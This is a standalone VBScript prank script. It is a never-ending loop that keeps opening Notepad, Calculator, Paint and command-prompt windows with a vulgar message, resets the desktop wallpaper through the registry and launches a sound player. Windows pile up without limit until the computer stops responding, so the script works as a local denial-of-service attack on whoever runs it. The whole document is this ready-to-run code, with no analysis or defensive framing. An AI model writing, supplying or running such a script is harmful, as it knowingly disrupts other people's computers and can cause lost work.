Do
    Set objShell = CreateObject("WScript.Shell")

    ' Open multiple instances of different applications
    objShell.Run "notepad.exe"
    objShell.Run "calc.exe"
    objShell.Run "mspaint.exe"
    objShell.Run "cmd.exe /k echo Your computer is now shitting itself!"

    ' Change the desktop wallpaper
    strWallpaperPath = "C:\Windows\Web\Wallpaper\Windows\img1.jpg" ' Change this to any image path you have
    objShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", strWallpaperPath
    objShell.Run "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"

    ' Play a sound loop
    objShell.Run "mplayer2.exe C:\Windows\Media\chime.wav" ' Change this to any sound file path you have
Loop
